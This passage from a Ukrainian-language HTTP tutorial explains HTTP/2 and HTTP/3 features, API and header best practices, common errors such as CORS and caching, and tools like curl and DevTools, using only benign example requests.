Переваги:

-   Ефективніший парсинг
-   Менше помилок
-   Компактніший

### Multiplexing:

**HTTP/1.1:**

```
З'єднання 1: [Request1] ────> [Response1]
З'єднання 2: [Request2] ────> [Response2]
З'єднання 3: [Request3] ────> [Response3]
```

**HTTP/2:**

```
Одне з'єднання:
  Stream 1: [Request1] ──┐
  Stream 2: [Request2] ──┼──> [Response1, Response2, Response3 паралельно]
  Stream 3: [Request3] ──┘
```

**Переваги:**

-   Немає head-of-line blocking
-   Менше overhead (одне з'єднання)
-   Швидше завантаження

### Server Push:

Сервер може відправляти ресурси БЕЗ запиту!

**Приклад:**

```http
Клієнт: GET /index.html

Сервер відповідає:
1. HTML (/index.html)
2. PUSH: CSS (/style.css)     ← сервер відправляє без запиту
3. PUSH: JS (/app.js)         ← сервер відправляє без запиту
4. PUSH: Logo (/logo.png)     ← сервер відправляє без запиту
```

**Браузер отримує все одразу!**

### Header Compression (HPACK):

**HTTP/1.1:**

```http
Запит 1:
GET /page1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 ...
Cookie: session=abc123xyz789...
[1234 bytes заголовків]

Запит 2:
GET /page2 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 ...
Cookie: session=abc123xyz789...
[1234 bytes заголовків — ДУБЛІКАТ!]
```

**HTTP/2 з HPACK:**

```
Запит 1: [1234 bytes заголовків]
Запит 2: [50 bytes] ← тільки зміни!
```

**HPACK використовує:**

-   Static table (попередньо визначені заголовки)
-   Dynamic table (заголовки з попередніх запитів)
-   Huffman encoding

### Stream Prioritization:

Можна вказати пріоритети для streams:

```
Stream 1 (HTML): Priority = HIGH, Weight = 256
Stream 2 (CSS): Priority = HIGH, Weight = 220
Stream 3 (JS): Priority = MEDIUM, Weight = 128
Stream 4 (Image): Priority = LOW, Weight = 32
```

Сервер відправить найважливіші ресурси першими.

### Приклад HTTP/2 взаємодії:

**Клієнт відправляє (множинні streams паралельно):**

```
Stream 1: GET /index.html
Stream 3: GET /style.css
Stream 5: GET /app.js
Stream 7: GET /data.json
```

**Сервер відповідає (в будь-якому порядку):**

```
Stream 1: HTML (200 OK)
Stream 5: JS (200 OK)
Stream 3: CSS (200 OK)
Stream 7: JSON (200 OK)
```

**Плюс Server Push:**

```
Stream 2: PUSH /logo.png (без запиту)
Stream 4: PUSH /font.woff (без запиту)
```

### Перехід на HTTP/2:

**Вимоги:**

-   HTTPS (TLS) — обов'язково для браузерів
-   Підтримка сервера (Nginx, Apache 2.4.17+)

**Перевірка:**

```bash
curl -I --http2 https://example.com

# Відповідь:
HTTP/2 200
content-type: text/html
...
```

**Nginx налаштування:**

```nginx
listen 443 ssl http2;
```

**Apache налаштування:**

```apache
Protocols h2 http/1.1
```

### HTTP/2 vs HTTP/1.1:

| Характеристика     | HTTP/1.1  | HTTP/2        |
| ------------------ | --------- | ------------- |
| Формат             | Текстовий | Бінарний      |
| З'єднання          | Багато    | Одне          |
| Multiplexing       | ❌        | ✅            |
| Server Push        | ❌        | ✅            |
| Header Compression | ❌        | ✅ (HPACK)    |
| Пріоритизація      | ❌        | ✅            |
| Швидкість          | Базова    | Значно швидше |

---

## HTTP/3: майбутнє протоколу

### Що таке HTTP/3?

**HTTP/3 = HTTP/2 + QUIC**

**QUIC** (Quick UDP Internet Connections) — новий транспортний протокол від Google, використовує UDP замість TCP!

### Навіщо HTTP/3?

**Проблеми TCP:**

1. **Head-of-line blocking на рівні TCP** — втрата одного пакету блокує всі streams
2. **Повільний handshake** — TCP + TLS = 2-3 round trips
3. **Немає міграції з'єднань** — зміна IP розриває з'єднання

**QUIC рішення:**

1. Streams незалежні на рівні транспорту
2. 0-RTT або 1-RTT handshake
3. Connection migration

### Ключові особливості HTTP/3:

#### 1. UDP замість TCP

```
HTTP/1.1, HTTP/2:
IP → TCP → TLS → HTTP

HTTP/3:
IP → UDP → QUIC (з вбудованим TLS 1.3) → HTTP/3
```

#### 2. Швидше встановлення з'єднання

**HTTP/2 (TCP + TLS):**

```
1. TCP SYN →
2. ← TCP SYN-ACK
3. TCP ACK →
4. TLS Client Hello →
5. ← TLS Server Hello + Certificate
6. TLS Finished →
7. ← TLS Finished
8. HTTP Request →

= 3-4 round trips (~300ms на 100ms latency)
```

**HTTP/3 (QUIC):**

```
1. QUIC Initial + TLS Client Hello + HTTP Request →
2. ← QUIC Response + TLS Server Hello + HTTP Response

= 1 round trip (~100ms)
```

**Наступні з'єднання (0-RTT):**

```
1. QUIC 0-RTT + HTTP Request →
2. ← HTTP Response

= 0 round trips! Миттєво!
```

#### 3. Немає Head-of-Line Blocking

**HTTP/2 (TCP):**

```
Streams: [A] [B] [C] [D]

Втрачено пакет з Stream B → TCP блокує ВСІ streams (A, C, D чекають!) ❌
```

**HTTP/3 (QUIC):**

```
Streams: [A] [B] [C] [D]

Втрачено пакет з Stream B → тільки Stream B чекає, A, C, D продовжують ✅
```

#### 4. Connection Migration

**TCP:**

```
Wi-Fi → 4G (IP змінюється)
→ З'єднання розривається ❌
→ Потрібен новий handshake
```

**QUIC:**

```
Wi-Fi → 4G (IP змінюється)
→ З'єднання продовжує працювати ✅
→ Жодних затримок
```

**Використання:**

-   Мобільні пристрої (перемикання мереж)
-   VPN підключення/відключення
-   Load balancing

### Приклад HTTP/3 запиту:

З точки зору HTTP синтаксис той самий:

```http
GET /index.html HTTP/3
Host: example.com
User-Agent: Chrome/120.0
Accept: text/html
```

Але на рівні транспорту:

-   Використовується UDP
-   QUIC забезпечує надійність
-   Вбудоване шифрування (TLS 1.3)

### Alt-Svc заголовок:

HTTP/2 сервер вказує, що підтримує HTTP/3:

```http
HTTP/2 200 OK
alt-svc: h3=":443"; ma=86400
Content-Type: text/html

<!DOCTYPE html>...
```

**Що означає:**

-   `h3` — HTTP/3 доступний
-   `:443` — на порту 443
-   `ma=86400` — ця інформація валідна 24 години

Браузер спробує використати HTTP/3 для наступних запитів.

### HTTP/3 у дії:

**Перший візит:**

```
1. Клієнт → Сервер: HTTP/2 запит
2. Сервер → Клієнт: HTTP/2 відповідь + alt-svc: h3=":443"
3. Браузер запам'ятовує: "example.com підтримує HTTP/3"
```

**Наступні візити:**

```
1. Клієнт → Сервер: HTTP/3 запит (QUIC)
2. Сервер → Клієнт: HTTP/3 відповідь (QUIC)

→ Швидше, надійніше!
```

### Перевірка HTTP/3:

**Chrome DevTools:**

```
Network tab → Protocol column → "h3" або "h3-29"
```

**curl (з HTTP/3 підтримкою):**

```bash
curl --http3 https://cloudflare.com -I

HTTP/3 200
content-type: text/html
...
```

**Online тест:**

```
https://http3check.net/
```

### Підтримка HTTP/3:

**Браузери (2024):**

-   ✅ Chrome 87+
-   ✅ Edge 87+
-   ✅ Firefox 88+
-   ✅ Safari 14+
-   ✅ Opera 73+

**Сервери:**

-   ✅ Cloudflare (підтримує з 2019)
-   ✅ Google (всі сервіси)
-   ✅ Facebook
-   ✅ Nginx (з модулем quiche)
-   ✅ LiteSpeed
-   ⚠️ Apache (експериментальна підтримка)

### HTTP/1.1 vs HTTP/2 vs HTTP/3:

| Характеристика        | HTTP/1.1    | HTTP/2    | HTTP/3        |
| --------------------- | ----------- | --------- | ------------- |
| Транспорт             | TCP         | TCP       | QUIC (UDP)    |
| Multiplexing          | ❌          | ✅        | ✅            |
| Head-of-line blocking | ✅ (сильно) | ⚠️ (TCP)  | ❌            |
| Handshake             | TCP + TLS   | TCP + TLS | QUIC (швидше) |
| 0-RTT                 | ❌          | ❌        | ✅            |
| Connection migration  | ❌          | ❌        | ✅            |
| Header compression    | ❌          | HPACK     | QPACK         |
| Server Push           | ❌          | ✅        | ✅            |

---

## Найкращі практики

### 1. Використовуйте правильні HTTP методи

```
✅ GET /users          — отримання списку
✅ POST /users         — створення
✅ PUT /users/123      — повне оновлення
✅ PATCH /users/123    — часткове оновлення
✅ DELETE /users/123   — видалення

❌ GET /deleteUser?id=123
❌ POST /getUsers
```

### 2. Використовуйте правильні статус коди

```
✅ 200 — успішно (GET, PUT, PATCH)
✅ 201 — створено (POST)
✅ 204 — успішно, без контенту (DELETE)
✅ 400 — помилка клієнта (валідація)
✅ 401 — не аутентифікований
✅ 403 — не авторизований
✅ 404 — не знайдено
✅ 500 — помилка сервера

❌ Завжди 200, помилки в JSON
```

### 3. Версіонування API

```
✅ /api/v1/users
✅ /api/v2/users
✅ Accept: application/vnd.api+json; version=2

❌ /api/users (без версії)
```

### 4. Використовуйте HTTPS

```
✅ https://example.com
✅ Strict-Transport-Security: max-age=31536000

❌ http://example.com (для будь-чого крім локалхоста)
```

### 5. Налаштуйте CORS правильно

```
✅ Access-Control-Allow-Origin: https://trusted-site.com
✅ Access-Control-Allow-Credentials: true

❌ Access-Control-Allow-Origin: * (з credentials)
```

### 6. Кешування

```
✅ Статичні ресурси:
   Cache-Control: public, max-age=31536000, immutable

✅ HTML:
   Cache-Control: no-cache, must-revalidate

✅ API:
   Cache-Control: private, no-store

❌ Немає Cache-Control взагалі
```

### 7. Compression

```
✅ Завжди використовуйте gzip/brotli для тексту
✅ Content-Encoding: br
✅ Vary: Accept-Encoding

❌ Відправляти некомпресований текст
```

### 8. Rate Limiting

```
✅ X-RateLimit-Limit: 1000
✅ X-RateLimit-Remaining: 999
✅ X-RateLimit-Reset: 1703332800
✅ 429 Too Many Requests з Retry-After

❌ Немає ліміту (ризик DDoS)
```

### 9. Pagination

```
✅ GET /users?page=2&limit=20
✅ Link: <...?page=3>; rel="next"

❌ Повертати 10000 елементів одразу
```

### 10. Безпечні заголовки

```
✅ Strict-Transport-Security
✅ Content-Security-Policy
✅ X-Content-Type-Options: nosniff
✅ X-Frame-Options: DENY
✅ HttpOnly та Secure cookies

❌ Відсутність security headers
```

### 11. Детальні помилки

```
✅ {
    "error": {
      "code": "VALIDATION_ERROR",
      "message": "Email невалідний",
      "field": "email",
      "timestamp": "2024-12-23T10:00:00Z"
    }
  }

❌ "Error"
❌ Тільки статус код без пояснення
```

### 12. Ідемпотентність

```
✅ GET, PUT, DELETE — ідемпотентні
✅ Повторний DELETE /users/123 → 404 (не помилка)

❌ POST як ідемпотентний (створить дублікати)
```

### 13. HTTP/2 або HTTP/3

```
✅ Використовуйте HTTP/2 мінімум
✅ HTTP/3 для кращої продуктивності
✅ Мультиплексування та compression

❌ HTTP/1.1 з багатьма з'єднаннями
```

### 14. Request ID

```
✅ X-Request-ID: req_abc123xyz
✅ Логування з Request ID
✅ Повернення в відповіді

❌ Немає трейсингу запитів
```

### 15. Content-Type

```
✅ Завжди вказуйте Content-Type
✅ application/json; charset=utf-8
✅ Перевіряйте Content-Type клієнта

❌ Припущення про тип даних
```

---

## Поширені проблеми та їх рішення

### 1. CORS помилки

**Проблема:**

```
Access to fetch at 'https://api.example.com' from origin 'https://my-app.com'
has been blocked by CORS policy
```

**Рішення:**

```http
# Сервер повинен відповісти:
Access-Control-Allow-Origin: https://my-app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

### 2. Cookie не зберігаються

**Проблема:**

```
Set-Cookie відправлений, але браузер не зберігає
```

**Рішення:**

```http
# Для HTTPS:
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=None

# Для localhost:
Set-Cookie: session=abc; HttpOnly; SameSite=Lax

# Перевірте Domain і Path
```

### 3. 401 vs 403 плутанина

**401 Unauthorized:**

```
→ Користувач НЕ залогінений
→ Потрібна аутентифікація
→ WWW-Authenticate заголовок
```

**403 Forbidden:**

```
→ Користувач залогінений
→ Але НЕ має прав
→ Аутентифікація НЕ допоможе
```

### 4. Кеш не працює

**Проблема:**

```
Браузер завжди запитує сервер
```

**Рішення:**

```http
# Перевірте заголовки:
Cache-Control: public, max-age=3600
ETag: "abc123"
Last-Modified: Mon, 20 Dec 2024 10:00:00 GMT

# Уникайте:
Cache-Control: no-cache, no-store
Pragma: no-cache
```

### 5. Великі заголовки

**Проблема:**

```
431 Request Header Fields Too Large
```

**Рішення:**

```
- Зменшити розмір cookies
- Видалити непотрібні заголовки
- Збільшити ліміт на сервері (не рекомендується)
```

### 6. Mixed Content

**Проблема:**

```
Сторінка на HTTPS, але завантажує HTTP ресурси
```

**Рішення:**

```html
<!-- ❌ -->
<script src="http://example.com/script.js"></script>

<!-- ✅ -->
<script src="https://example.com/script.js"></script>

<!-- ✅ Protocol-relative -->
<script src="//example.com/script.js"></script>
```

### 7. Timeout

**Проблема:**

```
504 Gateway Timeout або 408 Request Timeout
```

**Рішення:**

```
- Збільшити timeout на сервері/проксі
- Оптимізувати запит (пагінація, індекси)
- Асинхронна обробка (202 Accepted)
- Retry логіка на клієнті
```

### 8. Redirect loop

**Проблема:**

```
/page → 301 → /page → 301 → ...
```

**Рішення:**

```
- Перевірити логіку редиректів
- Уникати циклічних редиректів
- Максимум редиректів (браузери обмежують ~20)
```

### 9. Charset проблеми

**Проблема:**

```
Кирилиця відображається як ????
```

**Рішення:**

```http
Content-Type: text/html; charset=utf-8

# В HTML:
<meta charset="utf-8">

# Завжди використовуйте UTF-8!
```

### 10. Preflight OPTIONS fails

**Проблема:**

```
OPTIONS request → 403 або 404
```

**Рішення:**

```
- Сервер ПОВИНЕН відповідати на OPTIONS
- Статус 200 або 204
- Всі необхідні CORS заголовки
- Не вимагати аутентифікацію для OPTIONS
```

---

## Корисні інструменти

### 1. curl

```bash
# Простий запит
curl https://example.com

# З заголовками
curl -H "Authorization: Bearer token" https://api.example.com

# POST з JSON
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"name": "Іван"}'

# Показати заголовки
curl -I https://example.com

# Verbose (детальна інформація)
curl -v https://example.com

# HTTP/2
curl --http2 https://example.com

# HTTP/3
curl --http3 https://cloudflare.com
```

### 2. Browser DevTools

**Chrome/Firefox:**

```
F12 → Network tab
- Переглянути всі запити/відповіді
- Заголовки
- Timing
- Preview/Response
```

### 3. Postman

-   GUI для API тестування
-   Колекції запитів
-   Автоматизація тестів

### 4. HTTPie

```bash
# Більш читабельний за curl
http GET https://api.example.com/users
http POST https://api.example.com/users name=Іван email=ivan@example.com
```

### 5. Online інструменти

-   **https://http3check.net/** — перевірка HTTP/3
-   **https://securityheaders.com/** — аналіз security headers
-   **https://www.ssllabs.com/ssltest/** — перевірка SSL/TLS
-   **https://tools.keycdn.com/http2-test** — перевірка HTTP/2

---

## Висновок

HTTP — це фундаментальний протокол Інтернету, який постійно еволюціонує:

**HTTP/0.9 (1991)** → Простий, тільки HTML
**HTTP/1.0 (1996)** → Заголовки, різні типи контенту
**HTTP/1.1 (1997)** → Persistent connections, кешування
**HTTP/2 (2015)** → Бінарний, multiplexing, compression
**HTTP/3 (2022)** → QUIC, UDP, ще швидше

**Ключові концепції:**

-   Request-Response модель
-   Stateless природа
-   Клієнт-серверна архітектура
-   Методи, статус коди, заголовки
-   Кешування, compression, безпека
-   CORS, Content Negotiation

**Найкращі практики:**

-   Використовуйте HTTPS завжди
-   Правильні HTTP методи та статус коди
-   Налаштуйте кешування
-   Compression для текстових даних
-   Security headers (HSTS, CSP, тощо)
-   HTTP/2 або HTTP/3 для продуктивності
-   Детальні помилки для розробників
-   Rate limiting та pagination

**Продовжуйте вивчення:**

-   RFC 7230-7235 (HTTP/1.1)
-   RFC 7540 (HTTP/2)
-   RFC 9114 (HTTP/3)
-   MDN Web Docs
-   Практика з curl, DevTools, Postman

Успіхів у розробці! 🚀
